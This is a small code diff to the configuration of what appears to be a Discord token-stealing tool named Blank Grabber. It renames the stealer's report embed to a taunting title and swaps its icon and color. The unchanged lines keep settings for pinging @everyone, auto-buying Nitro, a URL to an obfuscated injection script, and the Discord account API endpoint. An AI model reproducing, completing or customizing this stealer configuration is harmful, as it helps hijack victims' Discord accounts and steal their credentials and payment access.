@@ -16,9 +16,9 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'Blank Grabber', 
-  embed_icon: 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png', 
-  embed_color: 0, 
+  embed_name: 'Bro Thought He Could Escape', 
+  embed_icon: 'https://cdn.discordapp.com/attachments/1110191841963409458/1123408490958966834/download_2.jpg', 
+  embed_color: 16777215, 
   injection_url: 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/Blank%20Grabber/Data/injection-obfuscated.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
